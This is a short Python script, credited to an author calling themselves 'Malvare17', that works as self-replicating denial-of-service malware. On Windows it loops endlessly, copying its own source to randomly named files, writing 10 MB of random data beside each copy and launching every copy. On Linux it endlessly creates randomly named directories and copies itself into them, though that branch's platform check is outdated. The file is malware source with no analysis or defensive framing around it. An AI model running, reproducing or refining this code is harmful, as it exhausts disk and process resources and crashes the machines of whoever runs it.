import sys, os, random, string, subprocess, threading

SCRIPT = sys.argv
NAME = str(SCRIPT[0])

def RANDOM_(Length):
	Letters_ = string.ascii_lowercase
	return ''.join(random.choice(Letters_) for i in range(Length))

def WIN32_():
	I = open(__file__).read()
	import random,subprocess,os
	NAME = str(random.randint(1,1000000))
	with open(NAME+'.py','w') as f:
		f.write(I)
	with open(NAME,'wb') as big_file:
		big_file.write(os.urandom(10240000))
	my_file = '{}.py'.format(NAME)
	process = subprocess.Popen(["python", my_file], shell =False)

def LINUX_():
	DIR_NAME_1 = RANDOM_(32)
	DIR_NAME_2 = RANDOM_(32)
	DIR_NAME_3 = RANDOM_(32)
	DIR_NAME_4 = RANDOM_(32)

	DirectoryName = DIR_NAME_1 + DIR_NAME_2 + DIR_NAME_3 + DIR_NAME_4
	subprocess.call(['mkdir', DirectoryName])
	subprocess.call(['cp', NAME, DirectoryName])

class THREAD_(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		if sys.platform == "win32":
			while True:
				WIN32_()

		elif sys.platform == "linux2":
			while True:
				LINUX_()


print("Author: Malvare17 | https://github.com/Malvare17")

ThreadA = THREAD_()
ThreadA.start()
